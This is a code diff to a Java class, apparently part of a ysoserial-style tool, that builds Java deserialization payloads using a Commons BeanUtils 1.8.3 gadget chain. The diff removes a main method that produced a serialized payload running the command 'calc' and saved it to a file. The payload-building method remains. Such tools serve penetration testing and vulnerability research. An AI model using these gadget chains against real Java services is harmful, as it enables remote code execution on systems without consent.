@@ -9,18 +9,10 @@ import javassist.CtField;
 import org.apache.commons.beanutils.BeanComparator;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.PriorityQueue;
 
 public class CommonsBeanutils1183NOCC {
-
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("333.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object template = Gadgets.createTemplatesImpl(type, param);
